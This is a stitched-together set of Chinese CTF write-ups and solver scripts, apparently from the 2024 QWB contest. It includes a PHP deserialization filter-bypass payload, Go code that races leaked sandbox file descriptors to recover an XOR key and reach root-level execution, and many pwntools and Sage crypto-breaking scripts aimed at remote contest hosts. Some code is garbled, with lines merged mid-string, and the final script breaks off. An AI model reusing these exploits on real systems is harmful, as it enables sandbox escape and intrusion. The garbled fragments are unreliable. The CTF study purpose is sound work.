$user=unserialize(filter($_POST["password"]));
if(strpos($user->username, "admin") == 0 && $user->password == "2024qwb"){
    echo "hello!";
}

Filter 这样子绕过

还不能超过 170（需要删掉序列化中一些无用的变量）

$obj = new root();
$g1 = new guest();
$g1->username = "admin";
$obj->username = $g1;
$u1 = new user();
$u1->username = "2024qwb";
$g1->value = $u1;
$obj->value = &$u1->username;

echo "n";
echo serialize($obj);
echo "n";

unsetunset5.7 Playgroundunsetunset

sandbox 里面虽然 close 了很多 fd，清理工作还做得挺好的。但是漏了一个 connection没有 close。这个 connection 会一路继承到我们要执行的 /prog，并且如果还有其它有效的 connection的话，也会一起继承下去。所以 /prog 是有可能能通过 recv 这些 fd 来截获 app.py 发送的数据的。

并且 app.py 发送的 prog 数据都是 XOR 过 key 的，并且 prog 的数据已知，所以能截获到加密后的数据可以还原 key。所以就先写个 go 程序，把全部 fd 都 recv 一遍，看看有啥东西

package main
import (
  "fmt"
  "os"
  "os/signal"
  "syscall"
)

func main() {
  sigc := make(chan os.Signal, 1)
  signal.Notify(sigc, syscall.SIGALRM)
  go func() { _ = <-sigc; os.Exit(1); }()
  syscall.Syscall(syscall.SYS_ALARM, 1, 0, 0)

  buf := make([]byte, 12345)
  for i := 0; i < 100; i++ {
    for true {
      n, _, err := syscall.Recvfrom(i, buf, 0)
      if err != nil || n == 0 {
        break
      }
      if n != 12345 {
        fmt.Printf("%d: (%d) %xn", i, n, buf[:n])
      }
    }
  }
}

然后扔一堆并发请求去打竞争，确实能收到东西。

PROG = '<上面的程序>'

def work_thread():
    while True:
        j = requests.post('http://XXXXXX:
5000/api/run', json={'code': PROG}).json()
        if j['status'] == 'success':
            print(base64.b64decode(j['data']).decode())

for _ in range(8):
    threading.Thread(target=work_thread).start()

并且 app.py 发送数据似乎是以 0x10000 的长度分包的，所以接收到的不完整的数据大概率是 0x10000 边界末尾的数据。拿截获到的数据和 prog 相应位置的数据 XOR 一下，就能还原出 key 了。

还原出 key 之后，就可以自由地和 sandbox 交互了，并且可以修改 options，降低 sandbox level。level = 0 就相当于是 root RCE，只剩下 chroot 和几个不痛不痒的 seccomp 限制了。

然后 go 的 net.Dial 貌似因为某些原因用不了，所以就只能去手敲系统调用去跟 sandbox 交互了

package main
import (
  "bufio"
  "bytes"
  "encoding/binary"
  "encoding/hex"
  "fmt"
  "os"
  "syscall"
  "unsafe"
)

func main() {
  key, err := hex.DecodeString("<key>")
  exe, err := hex.DecodeString("")

  socket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)

  var addr syscall.SockaddrInet4
  addr.Port = 2077
  addr.Addr = [4]byte{127, 0, 0, 1}
  err = syscall.Connect(socket, &addr)

  chall := make([]byte, 0x40)
  n, _, err := syscall.Recvfrom(socket, chall, 0)
  for i, b := range key {
    chall[i] ^= b
  }
  for i, _ := range exe {
    exe[i] ^= key[i % len(key)]
  }

  var buf bytes.Buffer
  writer := bufio.NewWriter(&buf)
  binary.Write(writer, binary.LittleEndian, int32(len(exe) + len(chall)))
  binary.Write(writer, binary.LittleEndian, int32(48))
  writer.Write(chall)
  writer.Write(exe)
  writer.Flush()
  syscall.Sendto(socket, buf.Bytes(), 0, nil)

  buf2 := make([]byte, 1024)
  for true {
    n, _, err := syscall.Recvfrom(socket, buf2, 0)
    if err != nil || n == 0 {
      break
    }
    fmt.Printf("%xn", buf2[:n])
  }
}

剩下 root escape 的部分就不再阐述。


```
def gao_taowa(d_, b, n, e):
  ub = 365
  bb = 40
  eb = 128
  pb = 512

  # d = 2^u * d1 + d2
  # d1 = b * d3 + d4
  # d = 2^u * b * d3 + 2^u * d4 + d2
  dmb = d_ % 2^ub
  d3b = d_ >> ub
  assert d3b % b == 0
  d3 = d3b // b

  # D = 2^u * b * d3
  # d = D + b * kmb + dmb
  D = 2^ub * b * d3
  D = e * (D + dmb) - 1
  C1 = 2^(eb + pb - ub)
  C2 = 2^(eb + pb - eb)
  B = matrix(ZZ, [
    [D        , 0 , 0],
    [e * b    , C1, 0],
    [-(n + 1) , 0 , C2]
  ])

  L = B.LLL(3/4)
  k = Integer((L[1] * B^(-1))[-1])

  DD = k * (n+1) - D
  ell = 108
  be = b * e
  ppqhell = (DD // k) >> (pb + 1 - ell)
  ppqlbe = DD * k.inverse_mod(be) % (be)

  error = 4
  pmqhell = floor(pow((ppqhell << (pb + 1 - ell))^2 - 4 * n, 1/2))
  pmqhell >>= pb + 1 - ell + error
  pmqlbe = Zmod(be)(ppqlbe^2 - 4 * n).nth_root(2, all=True)

  phell = ((ppqhell >> error) + pmqhell) // 2

  # p = A h + x
  # p = l % be
  # x' = l - A h % be
  # x = k * be + x' (k: pbits + 1 - ell + error - ebits - bbits) (k approx 513 - 104 - 168)
  # p = A * h + k * be + x'
  for _ in pmqlbe:
    plbe = (ppqlbe + _) * Integer(2).inverse_mod(be) % be

    A = 2^(pb + 1 - ell + error)
    h = phell
    l = plbe
    x2 = Integer((l - A * h) % be)

    PR.<x> = PolynomialRing(Zmod(n))
    f = A * h + x * be + x2
    f = f.monic()
    roots = f.small_roots(X=2^(pb+1-ell+error-eb-bb), beta=0.3, epsilon=0.01)  # or smaller epsilon
    print(roots)

    if roots:        
      k = Integer(roots[0])
      p = A * h + k * be + x2
      if n % p == 0:
        q = n // p
        print('p = %d' % p)
        print('q = %d' % q)
        assert p * q == n
        return p, q
  return None, None
from pwn import *
from sage.all import *
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes
from coppersmith import small_roots
load('tover.sage')

class Gao:
    def __init__(self):
        # self.conn = process(['python3', 'another.py'])
        self.conn = remote('39.107.90.219', 26659)
    
    def gao_0(self):
        conn = remote('39.107.90.219', 26659)
        results = []
        for i in range(100):
            conn.sendlineafter('b:', '0')
            result = conn.recvline()
            if b'correct' in result:
                results.append('0')
            else:
                results.append('1')
        conn.close()
        return results

    def gao_1(self, results):
        self.conn.recvuntil('public key: ')
        self.n, self.e = eval(self.conn.recvline())
        for i in range(100):
            self.conn.sendlineafter('b:', results[i])
            result = self.conn.recvline()
            assert b'correct' in result

    def gao_2(self):
        self.conn.recvuntil(b'is: ')
        d_, blind = eval(self.conn.recvuntil(b'.')[:-1])

        self.p, self.q = gao_taowa(d_, blind, self.n, self.e)

        if self.p is not None:
            self.d = inverse_mod(self.e, (self.p - 1) * (self.q - 1))
            return True
        else:
            return False

    def gao_3(self):
        self.conn.recvuntil(b'is: ')
        c = int(self.conn.recvline())
        m = pow(c, self.d, self.n)
        self.conn.sendlineafter('token:', long_to_bytes(m).hex())

    def gao(self):
        results = self.gao_0()
        self.gao_1(results)
        if self.gao_2():
            self.gao_3()
            self.conn.interactive()
        else:
            raise Exception("GG")

if __name__ == '__main__':
    g = Gao()
    g.gao()
from tqdm import trange
from Crypto.Util.number import *
N=54642322838521966106812419124141939188989640814860878861908076164639367595
9145121966895462614693455142554411163028001396684372032321947092854090758624
1973400790290637426639994633474521237504778470452401128211738166232528044670
4897787659122983658402386409111680527237824015035597005313191262677046034069
3111592294870776292093558039681230850237745734700397178207719049329635803852
5918345428613882658054097045829584997486511884231335763642503260060763979765
0353675780470249861726402474026943128529940611865467085977350731870140237435
1328835155852578758928359706954579150254071531870851393723176220889311963677
33198938707
e=65537
g=3040871967959800581351382295274005388082419270793259228509099272494086612979335548205806725469849481228948811909984262857772287453967175931780503026101
enc=169217279901286549405410484546093060498006359685672908855046065850885358
7784111525919932614689259674005902903294306990214999295401335400595465024136
8176166717262074930938187076093385743103257206008984426730319621844540768570
0529068563728141312426715117366395837964460423408187964925670546828755262865
2177117957269752597315761438459186791120018967717784674354875007341279701686
2500896375745125624115608433787391085807075889515255210830361622016035288935
8532860375101763208002340975665900236158920007589811919320440649594981349559
6714530078817102172987011127379859329130451687163101397985820321788874029956
5006817016165
h = (N-1)//(2*g)
# print(h)
from gmpy2 import iroot
ab_ = h//(2*g)
# print(ab - a*b)

# print((ab - a*b).bit_length())

# print(2**24-13699487)

# for i in trange(2**24):
#     ab = ab_ - i
#     absum = h - 2*g*ab
#     if absum**2-4*ab < 0:
#         continue
#     abdiff = iroot(absum**2-4*ab, 2)[0]
#     a = (absum + abdiff) // 2
#     b = (absum - abdiff) // 2
#     if a*b == ab:
#         print(a)
#         print(b)
#         break

a = 47937386938884458900370786879118057275877357467300250370371787390211867366084642223134071188443797365024207320451316918915461052607536742271505969247375076726
b = 30817580160697031122119466051933934199293816720246050921169947835585517577173054601468730432823632268542332991565084729244237756343912826384891209074376593659

p = 2*g*a + 1
q = 2*g*b + 1

assert p*q == N
phi = (p-1)*(q-1)
d = pow(65537, -1, phi)
m = pow(enc,d,N)
print(long_to_bytes(m))
from Crypto.Util.number import *
from z3 import *

s = 18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170
n, e = (89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589, 65537)
c = 23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247

p, q = Int('p'), Int('q')
sol = Solver()
sol.add(p+q==s)
sol.add(p*q==n)
if sol.check() == sat:
    m = sol.model()
    p = m[p].as_long()
    q = m[q].as_long()
    d = inverse(e, (p-1)*(q-1))
    m = pow(c, d, n)
    print(long_to_bytes(m))
clist = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]
n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)
c = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244

from Crypto.Util.number import *

def gao_ortho(c, N):
    n = 100
    C = matrix(ZZ, n, 1, c)
    C = block_matrix([[identity_matrix(n), C]])
    C = C.LLL()
    C1 = C[:-2, :-1]
    C1 = C1.T.left_kernel().matrix()
    C1 = C1.LLL()
    a0 = C1[0]
    a1 = C1[1]
    c_ = vector(ZZ, c)
    res = C1.solve_left(c_)
    for p in res:
        if N % p == 0:
            return p, N // p
    else:
        raise Exception("GG")

p, q = gao_ortho(clist, n)
d = inverse(e, (p-1)*(q-1))
m = pow(c, d, n)
print(long_to_bytes(int(m)))
p, q = gao_ortho(clist, n)
d = inverse(e, (p-1)*(q-1))
m = pow(c, d, n)
print(long_to_bytes(int(m)))

c = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755
m = pow(c, d, n)
print(long_to_bytes(int(m)))
from pwn import *
from sage.all import *
from Crypto.Util.number import bytes_to_long
from base64 import b64decode

# context.log_level = 'DEBUG'

def decode(encoded_str, q, R):
    decoded_bytes = b64decode(encoded_str)
    integer = bytes_to_long(decoded_bytes)
    coefficients = []
    while integer > 0:
        coefficients.append(integer % q)
        integer //= q
    return R(coefficients)

q = 333337
n = 128
beta = 333
chance = 111
polyns = beta//chance
bound  = 106
R = PolynomialRing(GF(q),'x')

for __ in range(100):
    # r = process(['python3', 'analysis.py'])
    r = remote('47.94.226.70', int(38937))
    r.recvuntil(b'F: ')
    F = r.recvline().strip().decode()
    F = decode(F, q, R)
    print(F)

    ccc = 0

    GFy = GF(q**n, "y", modulus=F)
    BOUND = 0.0532 * beta * n**2
    for _ in range(chance):
        A = []
        for i in range(polyns):
            tmp = r.recvuntil(b': ')
            f = r.recvline().strip().decode()
            f = decode(f, q, R)
            A.append(GFy(f))
        assert len(A) == polyns
        # print(A)
        samples = A
        queries = []
        for sample in samples:
            trace = int(sample.trace() % q)
            # print(trace)

            if int(trace) - q // 2 < 0:
                # print(trace)
                queries.append(trace<=85000)
            else:
                # print(q - trace)
                queries.append(q - trace<=85000)

            if any(_>125000 for _ in queries):
                result = False

            cnt = sum(_>100000 for _ in queries)
            if cnt == 1 and sum(queries) < 170000:
                result = True

            # # print(abs(trace))
            # query = abs(trace) <= BOUND
            # queries.append(query)
            # print(queries)
            # # print(sum(queries))
            result = sum(queries) > 2
        # print(f"{result = }")
        sendval = str(1 if result else 0).encode()
        r.sendline(sendval)
        msg = r.recvline()
        # print(msg)
        if b'Correct guess' in msg:
            ccc += 1

    if ccc > 100:
        print('!'*50)
    print(ccc)
    print('BOUND:', BOUND)
    # r.interactive()
    msg = r.recvuntil(b'flag')
    if b'smart' in msg:
        print(r.recvline())
        print(r.recvline())
        break
    r.close()
    print()
from z3 import *
from pwn import *
from Crypto.Util.number import *
from sage.all import *
from tqdm import trange
import itertools
from hashlib import sha256
from recoverseed import pure_mt_solver, mt_gen_sol, timeit, random_seed
from sage.groups.generic import bsgs

def next_prime(x):
    if x % 2 == 0:
        x += 1
    else:
        x += 2
    while True:
        if isPrime(x):
            return x
        x += 2

class Gao:
    def __init__(self) -> None:
        # self.conn = process(['python3', 'analysis.py'])
        self.conn = remote('39.106.63.28', 24605)
        self.randnums = []
        self.new_state = None
        self.new_state1 = None
    
    def gao_sha(self):
        self.conn.recvuntil("b'")
        chall = self.conn.recvline().strip().decode()[:-1]
        part2, ans = chall[12:28], chall[-64:]
        print('FUCK SHA')
        for part1 in itertools.product(string.ascii_letters + string.digits, repeat=4):
            part1 = ''.join(part1)
            if sha256((part1+part2).encode()).hexdigest() == ans:
                print('FUCK SHA OK')
                self.conn.sendlineafter('Give me XXXX: ', part1)
                break
        else:
            raise Exception("FUCK SHA GG")

    def recv_var(self, var_name):
        self.conn.recvuntil(f'{var_name} = ')
        return eval(self.conn.recvline())

    def gao_1(self):
        # p = next_prime(2**249)
        p = 1458880324263435354653143896004668444118812509492335930192912734252582506251
        
        self.conn.sendlineafter('250> (119 * 8)) ^ msg
            num %= 2 ** (1344 - 119 * 8) # 392 bit
            t1 = num >> (48)
            t1 = t1 % (2**250) # Take 250-bit
            d = 65537
            Q_ = E.lift_x(ZZ(t1))
            P_ = d * Q_
            state = ZZ(P_.xy()[0])
            P, Q = map(E, (P, Q))
            r = 0
            for i in range(4):
                t = int((state * Q).xy()[0])
                r = r << 250 | t
                state = int((state * P).xy()[0])
            trailing = (c ^ r) % 2**(119 * 8)
            trailing = long_to_bytes(trailing)
            self.conn.sendlineafter('Enter m:n', heading + trailing)
            res = self.conn.recvline()
            assert b'Right' in res

            # r = bsgs(G, Q, (ZZ(0), ZZ(2**32)), '+')
            r = G.discrete_log(Q)
            self.randnums.append(r)
    
    def gao_new_state1(self):
        def inverse_right_mask(res, shift, mask=0xffffffff, bits=32):
            tmp = res
            for i in range(bits // shift):
                tmp = res ^ tmp >> shift & mask
            return tmp

        def inverse_left_mask(res, shift, mask=0xffffffff, bits=32):
            tmp = res
            for i in range(bits // shift):
                tmp = res ^ tmp << shift & mask
            return tmp

        def extract_number(y):
            y = y ^ y >> 11
            y = y ^ y << 7 & 2636928640
            y = y ^ y << 15 & 4022730752
            y = y ^ y >> 18
            return y&0xffffffff

        def recover(y):
            y = inverse_right_mask(y,18)
            y = inverse_left_mask(y,15,4022730752)
            y = inverse_left_mask(y,7,2636928640)
            y = inverse_right_mask(y,11)
            return y&0xffffffff

